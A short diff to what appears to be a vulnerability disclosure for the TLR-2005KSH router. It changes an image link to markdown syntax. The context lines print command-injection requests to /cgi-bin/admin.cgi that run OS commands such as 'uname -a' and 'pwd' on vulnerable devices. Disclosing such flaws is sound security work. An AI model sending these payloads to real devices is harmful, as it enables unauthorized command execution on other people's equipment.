@@ -8,7 +8,7 @@ By inputting the following payload to access vulnerable devices, an attacker can
 
 /cgi-bin/admin.cgi?Command=sysCommand&Cmd=uname%20-a
 
-(https://github.com/kklzzcun/route/tree/main/TLR-2005KSH/assets/1734088238407.jpg)
+![](https://github.com/kklzzcun/route/tree/main/TLR-2005KSH/assets/1734088238407.jpg)
 
 /cgi-bin/admin.cgi?Command=sysCommand&Cmd=pwd
 
